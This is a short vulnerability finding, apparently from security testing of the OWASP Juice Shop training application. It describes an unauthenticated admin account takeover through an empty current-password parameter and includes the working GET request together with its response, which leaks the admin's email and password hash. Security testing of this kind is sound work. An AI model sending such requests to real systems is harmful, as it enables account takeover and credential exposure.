title: Unauthenticated admin account takeover via empty-current-password in /rest/user/change-password
proof: GET /rest/user/change-password?current=&new=admin123&repeat=admin123 (anon, no session) returns: {"user":{"id":1,"email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin",...}} and changes admin password. Login then succeeds with the new password, returning admin JWT token.
